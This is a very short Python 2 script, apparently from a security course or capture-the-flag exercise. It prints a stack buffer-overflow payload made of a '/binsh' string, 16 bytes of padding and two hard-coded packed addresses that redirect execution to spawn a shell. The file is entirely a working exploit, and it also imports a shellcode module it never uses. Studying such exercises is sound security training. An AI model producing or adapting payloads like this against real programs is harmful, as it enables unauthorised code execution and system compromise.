from shellcode import shellcode 
from struct import pack 
import sys

print "/binsh" +"A"*16  +pack("<I",0x08048eed) + pack("<I",0xbffe8aaa )
